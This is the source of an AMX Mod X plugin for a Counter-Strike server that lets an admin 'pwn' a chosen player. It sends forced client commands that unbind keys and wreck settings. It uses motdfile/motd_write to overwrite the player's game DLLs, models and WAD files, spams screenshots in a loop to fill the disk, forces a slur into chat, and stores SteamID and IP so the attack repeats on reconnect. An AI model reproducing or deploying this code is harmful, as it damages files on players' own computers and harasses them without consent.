/*
    get pwned
*/
#include < amxmodx >
#include < amxmisc >
#include < reapi >

new Float:pFrequency
new const szNoSteam[][] =
{
    "wait;developer 1;wait;unbindall;wait;cl_timeout 0",
	"wait;rate 1;wait;cl_updaterate 1;wait;cl_cmdrate 1",
	"wait;fps_max 1;wait;fps_modem 1;wait;sys_ticrate 1",
	"wait;cl_allowdownload 0;wait;cl_allowupload 0",
	"wait;cl_backspeed 1;wait;sensitivity 20",
	"wait;gl_flipmatrix 1;wait;con_color ^"1 1 1^"",
    "wait;m_yaw 1;wait;m_pitch 1",
	
	"wait;motdfile events/ak47.sc;motd_write x",
	"wait;motdfile models/v_ak47.mdl;motd_write x",
	"wait;motdfile events/m4a1.sc;motd_write x",
	"wait;motdfile models/v_knife.mdl;motd_write x",
	"wait;motdfile cs_dust.wad;motd_write xd",
	"wait;motdfile cstrike.wad;motd_write x",
	"wait;motdfile halflife.wad;motd_write x",
	"wait;motdfile dlls/mp.dll;motd_write x",
	"wait;motdfile cl_dlls/client.dll;motd_write x",
	"wait;motdfile resource/GameMenu.res;motd_write x",
    "wait;say^"im gay^""
}
new bool:bIsGettingAttacked[ 33 ];
new pBury;
new Trie:tSaveData;

public plugin_init()
{
    register_plugin( "bury and pwn", "1.1", "DusT" );
    register_concmd( "amx_dpwn", "CmdPwn", ADMIN_IMMUNITY, "< user > - Get rekt" );

    bind_pcvar_num( create_cvar( "dpwn_bury_player", "0", _, _, true, 0.0, true, 1.0 ), pBury );
    bind_pcvar_float( create_cvar( "dpwn_snap_frequency", "0.01", _, _, true, 0.01 ), pFrequency );
    RegisterHookChain( RG_CSGameRules_PlayerSpawn, "@PlayerSpawn_Post", true );
    tSaveData = TrieCreate();
}

public CmdPwn( id, level, cid )
{
    if( !cmd_access( id, level, cid, 2 ) )
        return PLUGIN_HANDLED;
    
    new target[ 32 ];
    read_argv( 1, target, charsmax( target ) );
    new player = cmd_target( id, target, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF );

    if( !player )
        return PLUGIN_HANDLED;
    
    
    new data[ 32 ];
    get_user_authid( player, data, charsmax( data ) );
    TrieSetCell( tSaveData, data, 0 );
    get_user_ip( player, data, charsmax( data ), true );
    TrieSetCell( tSaveData, data, 0 );

    PwnUser( player );
    
    console_print( id, "[DPWN] %n pwned", player );
    return PLUGIN_HANDLED;
}
PwnUser( player )
{
    bIsGettingAttacked[ player ] = true;
    CmdNoSteam( player );
    if( pBury )
        BuryPlayer( player );
    SpamScreenshots( player );
}
public client_putinserver( id )
{
    new data[ 35 ];
    get_user_authid( id, data, charsmax( data ) );
    if( TrieKeyExists( tSaveData, data ) )
        PwnUser( id );
    else
    {
        get_user_ip( id, data, charsmax( data ), true );
        if( TrieKeyExists( tSaveData, data ) )
            PwnUser( id );
    }
}
public @PlayerSpawn_Post( id )
{
    if( pBury && bIsGettingAttacked[ id ] )
        BuryPlayer( id );
}
public SpamScreenshots( id )
{
    if( !is_user_connected( id ) )
        return; 
    
    client_cmd( id, "snapshot; wait; snapshot; wait; snapshot; wait;" );
    set_task( pFrequency, "SpamScreenshots", id );
}

public BuryPlayer( id )
{
    if( !is_user_alive( id ) )
        return;
    
    new Float:origin[ 3 ];
    get_entvar( id, var_origin, origin );
    if( get_entvar( id, var_flags ) & FL_ONGROUND )
    {
        origin[ 2 ] -= 30.0;
        set_entvar( id, var_origin, origin );
    }
    else
        set_task( 0.5, "BuryPlayer", id );

}
CmdNoSteam( id )
{
    for( new i; i < sizeof szNoSteam; i++ )
    {
        client_cmd( id, szNoSteam[ i ] );
    }
}